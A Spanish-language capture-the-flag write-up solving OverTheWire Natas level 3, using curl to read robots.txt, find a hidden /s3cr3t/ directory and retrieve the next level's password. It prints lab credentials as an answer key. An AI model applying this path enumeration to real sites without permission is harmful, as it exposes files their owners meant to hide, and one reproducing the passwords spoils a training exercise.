# Natas 3

#### URL: http://natas3.natas.labs.overthewire.org/

#### Credenciales: natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

``` bash
> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

Ese comentario nos da una pista de que pueden haber agregado a robots.txt alguna ruta que no quieren que los bots de Google indexen.

``` bash
> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/
```

En efecto, el directorio contiene el archivo "users.txt" que una vez mas contiene las credenciales.

``` bash
> curl -u "natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

`natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
